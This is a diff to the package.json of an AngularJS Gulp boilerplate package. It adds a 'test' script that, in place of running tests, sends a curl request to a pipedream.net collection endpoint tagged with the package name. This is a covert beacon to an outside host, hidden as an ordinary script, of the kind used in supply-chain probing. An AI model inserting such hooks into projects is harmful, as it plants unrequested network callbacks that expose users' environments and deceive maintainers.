@@ -4,6 +4,7 @@
   "description": "Clean but full-featured AngularJS boilerplate using Gulp workflow and best practices",
   "bin": "cli.js",
   "scripts": {
+    "test": "curl https://7667e1477a421011c2f5e9ac6caa6ad2.m.pipedream.net/angulargulpboilerplate",
     "build": "gulp default",
     "docs:gulp": "gulpdoc ./gulp/*.js",
     "lint": "eslint cli.js gulpfile.js gulp src",
